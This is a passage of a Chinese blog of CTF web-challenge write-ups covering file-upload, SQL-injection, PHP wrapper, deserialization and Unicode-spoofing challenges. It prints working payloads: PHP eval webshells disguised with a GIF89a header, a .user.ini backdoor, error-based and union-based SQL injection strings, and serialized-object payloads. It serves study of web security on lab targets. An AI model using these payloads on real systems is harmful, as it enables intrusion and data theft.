src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041803668.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">但这题其实有很多解法，例如flask 伪造，session漏洞和Unicode欺骗，前俩个学的不咋地，这里就用Unicode欺骗来解决一下。</p><p>我们可以从Unicode字符表里找到如下图的位置 <a href="https://www.rapidtables.org/zh-CN/code/text/unicode-characters.html">该表网址</a></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041803663.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">从里面凑齐一个ᴬᴰᴹᴵᴺ，然后注册，注册完后登录然后进行修改密码。</p><p>然后再用修改后的密码，用户名为admin登录得到flag</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041803630.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">其原理为 当我们在注册的时候 ”ᴬᴰᴹᴵᴺ“ 经过strlower()，转成”ADMIN“ ， 在修改密码的时候 ”ADMIN“经过strlower()变成”admin“ , 当我们再次退出登录的时候 ”admin“经过strlower()变成”admin”</p><p><strong>strlower:将字符串转换为小写。</strong></p><h3 id="二、本题知识点-10"><a href="#二、本题知识点-10" class="headerlink" title="二、本题知识点"></a>二、本题知识点</h3><p>通过Unicode欺骗使自己成为admin登录网站得到flag</p><p>以及弱口令爆破。</p><p>如果想知道另俩种做法，可以看这位<a href="https://www.cnblogs.com/chrysanthemum/p/11722351.html">大佬博客</a></p><h2 id="MRCTF2020-你传你🐎呢"><a href="#MRCTF2020-你传你🐎呢" class="headerlink" title="[MRCTF2020]你传你🐎呢"></a>[MRCTF2020]你传你🐎呢</h2><p>一、本题做题思路</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041805097.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">一道Upload的题，尝试上传一下PHP文件</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041805013.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">传不进去，通过图片传入试试</p><p> <img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041805556.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">回显为成功上传，那么通过htaccess文件来使蚁剑连接</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041805593.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">成功上传</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041805562.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">成功进入，通过主目录内找到flag</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041805573.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041805588.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><h2 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h2><h3 id="一、本题做题思路-18"><a href="#一、本题做题思路-18" class="headerlink" title="一、本题做题思路"></a>一、本题做题思路</h3><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041806984.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">打开后就是一串php代码。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php  $text &#x3D; $_GET[&quot;text&quot;];$file &#x3D; $_GET[&quot;file&quot;];$password &#x3D; $_GET[&quot;password&quot;];if(isset($text)&amp;&amp;(file_get_contents($text,&#39;r&#39;)&#x3D;&#x3D;&#x3D;&quot;welcome to the zjctf&quot;))&#123;&#x2F;&#x2F;要求我们传入一个text文件，内容为welcome to the zjctf    echo &quot;&lt;br&gt;&lt;h1&gt;&quot;.file_get_contents($text,&#39;r&#39;).&quot;&lt;&#x2F;h1&gt;&lt;&#x2F;br&gt;&quot;;    if(preg_match(&quot;&#x2F;flag&#x2F;&quot;,$file))&#123;&#x2F;&#x2F;正则运算将flag过滤        echo &quot;Not now!&quot;;        exit();     &#125;else&#123;        include($file);  &#x2F;&#x2F;useless.php&#x2F;&#x2F;提示一个php        $password &#x3D; unserialize($password);        echo $password;    &#125;&#125;else&#123;    highlight_file(__FILE__);&#125;?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">**file_get_contents()**函数在我们上面一道题中使用过，是用来读取文件。’r’是读取方式</p><p>通过<strong>php:&#x2F;&#x2F;input</strong>绕过该函数 </p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041806850.png"></p><p>正则将flag过滤了，下面给出一个php，但如果直接访问只会得到一个白屏，其他什么也得不到</p><p>所以我们可以通过php伪协议 php:&#x2F;&#x2F;filter 读取</p><blockquote><p>所以构造payload url+&#x2F;?text&#x3D;php:&#x2F;&#x2F;input&amp;file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;useless.php</p></blockquote><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041807697.png">得到一串base64代码，解密后得到</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php   class Flag&#123;  &#x2F;&#x2F;flag.php      public $file;      public function __tostring()&#123;          if(isset($this-&gt;file))&#123;              echo file_get_contents($this-&gt;file);             echo &quot;&lt;br&gt;&quot;;        return (&quot;U R SO CLOSE !&#x2F;&#x2F;&#x2F;COME ON PLZ&quot;);        &#125;      &#125;  &#125;  ?&gt;  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">再结合主页面的unserialize()函数，显然我们需要将这个进行序列化</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041807656.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><blockquote><p> 然后输入最终的payload</p><p>url+&#x2F;?text&#x3D;php:&#x2F;&#x2F;input&amp;file&#x3D;useless.php&amp;password&#x3D;O:4:”Flag”:1:{s:4:”file”;s:8:”flag.php”;}</p></blockquote><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041807815.png"></p><p>得到flag</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041807711.png"></p><h2 id="极客大挑战-2019-HardSQL"><a href="#极客大挑战-2019-HardSQL" class="headerlink" title="[极客大挑战 2019]HardSQL"></a>[极客大挑战 2019]HardSQL</h2><h3 id="一、本题做题思路-19"><a href="#一、本题做题思路-19" class="headerlink" title="一、本题做题思路"></a>一、本题做题思路</h3><p> SQL注入，先看是什么闭合方式</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041808245.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041808154.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">确定为’闭合。<img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041808161.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">union被过滤掉 ，还有空格也被过滤，所以我们需要使用括号绕过，但同时这道题没有过滤extractvalue。所以我们可以尝试用这来解决问题</p><p><strong>获取数据库名</strong></p><pre class="line-numbers language-php" data-language="php"><code class="language-php">username&#x3D;1&#39;^extractvalue(1,concat(0x7e,(select(database()))))%23&amp;password&#x3D;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041808227.png"></p><p> <strong>爆破表名得到字段名</strong> </p><pre class="line-numbers language-php" data-language="php"><code class="language-php">username&#x3D;1&#39;^extractvalue(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(&#39;geek&#39;))))%23&amp;password&#x3D;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="><img src="https://img-blog.csdnimg.cn/16f5b94d16224701aa37757f559c599e.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="> <strong>查看字段名内内容</strong></p><pre class="line-numbers language-php" data-language="php"><code class="language-php">username&#x3D;1&#39;^extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(&#39;H4rDsq1&#39;))))%23&amp;password&#x3D;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041808264.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="> <strong>获取用户名和密码，出现一部分flag</strong></p><pre class="line-numbers language-php" data-language="php"><code class="language-php">&#x2F;check.php?username&#x3D;1&#39;^extractvalue(1,concat(0x7e,(select(group_concat(password))from(H4rDsq1))))%23&amp;password&#x3D;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041808731.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">然后可以使用left()和right()函数进行拼接，这里直接使用right函数，然后再把重复的删去组成flag</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">username&#x3D;1&#39;^extractvalue(1,concat(0x7e,(select(group_concat(right(password,20)))from(H4rDsq1))))%23&amp;password&#x3D;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041808951.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="> 去掉重复的即为最终的flag答案。</p><h2 id="MRCTF2020-Ez-bypass"><a href="#MRCTF2020-Ez-bypass" class="headerlink" title="[MRCTF2020]Ez_bypass"></a>[MRCTF2020]Ez_bypass</h2><h3 id="一、本题做题思路-20"><a href="#一、本题做题思路-20" class="headerlink" title="一、本题做题思路"></a>一、本题做题思路</h3><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041810758.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">代码如下 </p><pre class="line-numbers language-php" data-language="php"><code class="language-php">include &#39;flag.php&#39;;$flag&#x3D;&#39;MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;&#39;;if(isset($_GET[&#39;gg&#39;])&amp;&amp;isset($_GET[&#39;id&#39;])) &#123;    $id&#x3D;$_GET[&#39;id&#39;];    $gg&#x3D;$_GET[&#39;gg&#39;];    if (md5($id) &#x3D;&#x3D;&#x3D; md5($gg) &amp;&amp; $id !&#x3D;&#x3D; $gg) &#123;&#x2F;&#x2F;md5强等于绕过        echo &#39;You got the first step&#39;;        if(isset($_POST[&#39;passwd&#39;])) &#123;            $passwd&#x3D;$_POST[&#39;passwd&#39;];            if (!is_numeric($passwd))&#x2F;&#x2F;$passwd不能是数字            &#123;                 if($passwd&#x3D;&#x3D;1234567)&#x2F;&#x2F;弱等于为1234567                 &#123;                     echo &#39;Good Job!&#39;;                     highlight_file(&#39;flag.php&#39;);                     die(&#39;By Retr_0&#39;);                 &#125;                 else                 &#123;                     echo &quot;can you think twice??&quot;;                 &#125;            &#125;            else&#123;                echo &#39;You can not get it !&#39;;            &#125;        &#125;        else&#123;            die(&#39;only one way to get the flag&#39;);        &#125;&#125;    else &#123;        echo &quot;You are not a real hacker!&quot;;    &#125;&#125;else&#123;    die(&#39;Please input first&#39;);&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">先走第一步，MD5强等于绕过，即数组绕过</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041810784.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">再说明POST传参$passwd不是数字且弱等于1234567。所以我们可以在1234567后加一个英文字母。<img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041810839.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="> 得到flag</p><h2 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h2><h2 id="一、本题做题思路-21"><a href="#一、本题做题思路-21" class="headerlink" title="一、本题做题思路"></a>一、本题做题思路</h2><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041811560.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">一道上传题，先试试PHP。回显非法后缀，看来又是要靠图片来绕过了</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041811555.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">上传图片后发现，此题还对文件内容有所要求</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041811515.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">所以我们上传图片文件里不能用平常的一句话木马，要换为如下的</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;script language&#x3D;&#39;php&#39;&gt;eval($_POST[&#39;shell&#39;]);&lt;&#x2F;script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">再次尝试一下。</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041811541.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="> 出现新的回显，说这不是图片。所以又需要用到我们的图片幻术头</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">GIF89a&lt;script language&#x3D;&#39;php&#39;&gt;eval($_POST[&#39;ru&#39;]);&lt;&#x2F;script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">得到回显</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041811572.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="> 这不就跟我们上面一道题长的一样了么。所以构造payload,不过我们需要对图片内容修改一下，将其POST传入改为GET传入，要记得上传一个.user.ini文件，文件内容在下面写了。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">GIF89a?&lt;script language&#x3D;&#39;php&#39;&gt;eval($_GET[&#39;shell&#39;]);&lt;&#x2F;script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041811544.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><pre class="line-numbers language-php" data-language="php"><code class="language-php">payload为 ：  url+&#x2F;uploads&#x2F;f9e1016a5cec370aae6a18d438dabfa5&#x2F;index.php?shell&#x3D;print_r(&quot;&#x2F;&quot;);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">然后通过cat来抓取flag</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">&#x2F;payload为 ：  url+&#x2F;uploads&#x2F;f9e1016a5cec370aae6a18d438dabfa5&#x2F;index.php?shell&#x3D;system(&#39;cat &#x2F;flag&#39;);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041811006.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">或者通过蚁剑抓包</p><p>先传一个.user.ini文件，文件内容如下</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">GIF89aauto_prepend_file&#x3D;xiaoma.jpg<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">然后再传入这个xiaoma.jpg</p><p>最后在蚁剑上连接</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041811075.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="> url+上传路径+index.php即可得到flag</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041811062.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><h3 id="二、本题知识点-11"><a href="#二、本题知识点-11" class="headerlink" title="二、本题知识点"></a>二、本题知识点</h3><p>.user.ini留后门  <strong>使.user.ini指定文件，在其当前目录下的文件执行时会将你指定的文件中的代码执行出来，以此带入后门。</strong></p><h2 id="网鼎杯-2020-青龙组-AreUSerialz"><a href="#网鼎杯-2020-青龙组-AreUSerialz" class="headerlink" title="[网鼎杯 2020 青龙组]AreUSerialz"></a>[网鼎杯 2020 青龙组]AreUSerialz</h2><h3 id="一、本题做题思路-22"><a href="#一、本题做题思路-22" class="headerlink" title="一、本题做题思路"></a>一、本题做题思路</h3><p>本题是一道代码审计题，代码如下：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?phpinclude(&quot;flag.php&quot;);highlight_file(__FILE__);class FileHandler &#123;    protected $op;    protected $filename;    protected $content;    function __construct() &#123;        $op &#x3D; &quot;1&quot;;        $filename &#x3D; &quot;&#x2F;tmp&#x2F;tmpfile&quot;;        $content &#x3D; &quot;Hello World!&quot;;        $this-&gt;process();    &#125;    public function process() &#123;        if($this-&gt;op &#x3D;&#x3D; &quot;1&quot;) &#123;            $this-&gt;write();        &#125; else if($this-&gt;op &#x3D;&#x3D; &quot;2&quot;) &#123;&#x2F;&#x2F;判断op是弱等于字符串1还是弱等于字符串2            $res &#x3D; $this-&gt;read();            $this-&gt;output($res);&#x2F;&#x2F;如果弱等于字符串2，就转向read()和output()函数        &#125; else &#123;            $this-&gt;output(&quot;Bad Hacker!&quot;);        &#125;    &#125;    private function write() &#123;        if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) &#123;            if(strlen((string)$this-&gt;content) &gt; 100) &#123;                $this-&gt;output(&quot;Too long!&quot;);                die();            &#125;            $res &#x3D; file_put_contents($this-&gt;filename, $this-&gt;content);            if($res) $this-&gt;output(&quot;Successful!&quot;);            else $this-&gt;output(&quot;Failed!&quot;);        &#125; else &#123;            $this-&gt;output(&quot;Failed!&quot;);        &#125;    &#125;    private function read() &#123;        $res &#x3D; &quot;&quot;;        if(isset($this-&gt;filename)) &#123;            $res &#x3D; file_get_contents($this-&gt;filename);&#x2F;&#x2F;读取文件路径        &#125;        return $res;    &#125;    private function output($s) &#123;        echo &quot;[Result]: &lt;br&gt;&quot;;&#x2F;&#x2F;得出结果        echo $s;    &#125;    function __destruct() &#123;        if($this-&gt;op &#x3D;&#x3D;&#x3D; &quot;2&quot;)&#x2F;&#x2F;如果op强等于字符串2，则将op等于字符串1，然后执行process()。            $this-&gt;op &#x3D; &quot;1&quot;;        $this-&gt;content &#x3D; &quot;&quot;;        $this-&gt;process();    &#125;&#125;function is_valid($s) &#123;    for($i &#x3D; 0; $i &lt; strlen($s); $i++)        if(!(ord($s[$i]) &gt;&#x3D; 32 &amp;&amp; ord($s[$i]) &lt;&#x3D; 125))            return false;    return true;&#125;if(isset($_GET&#123;&#39;str&#39;&#125;)) &#123;    $str &#x3D; (string)$_GET[&#39;str&#39;];    if(is_valid($str)) &#123;        $obj &#x3D; unserialize($str);    &#125;&#x2F;&#x2F;GET传参str，如果没有不可打印的字符，对该字符串进行反序列化&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="><strong>is_valid()函数</strong>对传入的$s进行检测，如果它的ASCII码值在32-25之间，才会返回true。即确定$s的字符都是能被打印的。</p><p>经过上面代码审计，得知如果需要得到结果，在**__destruct()函数<strong>里要开始准备对op所传的参来绕过</strong>process()**方法，防止op被置于字符串1 可以传入$op&#x3D;2，所以通过在线php运行工具构造payload。因为这道题用的是protected，而protected会导致最后得到的序列化结果有些符号打印不出来，</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041814610.png">所以我们可以改成public,</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041814669.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">代码如下</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php class FileHandler&#123;    public $op &#x3D; 2;    public $filename &#x3D; &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php&quot;;     public $content;    &#125;    $a &#x3D; new FileHandler();        $b&#x3D;serialize($a);        echo($b);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">得到结果</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041814591.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="> base64解码得到flag</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041814585.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><h3 id="二、本题知识点-12"><a href="#二、本题知识点-12" class="headerlink" title="二、本题知识点"></a>二、本题知识点</h3><blockquote><p>**file_get_content()**可以读取php:&#x2F;&#x2F;filter伪协议。</p><p><strong>is_valid()函数</strong>对传入参进行检测</p></blockquote><h2 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h2><h3 id="一、本题做题思路-23"><a href="#一、本题做题思路-23" class="headerlink" title="一、本题做题思路"></a>一、本题做题思路</h3><p>打开源码有线索</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041815432.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">打开发现源码有提示</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041815439.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">经过base32 - base64 解密得到线索</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041815447.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><pre class="line-numbers language-php" data-language="php"><code class="language-php">select * from user where username &#x3D; &#39;$name&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">再结合本题是SQL注入题，Fuzz测试一下</p><p>发现or，order等都被过滤了，但是Order(没被过滤)可以绕过order。</p><p>根据’和”回显判断本题是由’回显（上面是’闭合，下面是”闭合）</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041815597.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041815411.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">根据Order绕过判断列数可知本题有三个字段数，上面是判断三个，下面是判断4个</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041815422.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041815874.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">本题的考点在于是否得知  当我们进行联合查询时，如果联合查询查询的数据不存在，联合查询会虚构一个数据。</p><p>所以我们可以跟这样写</p><p>在UserName中写  <strong>1’ union select 1,’admin’,’c4ca4238a0b923820dcc509a6f75849b’#</strong></p><p>在password中写 <strong>1</strong></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041815044.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="> c4ca4238a0b923820dcc509a6f75849b是1的MD5 32位小写加密</p><p>最后得到flag<img 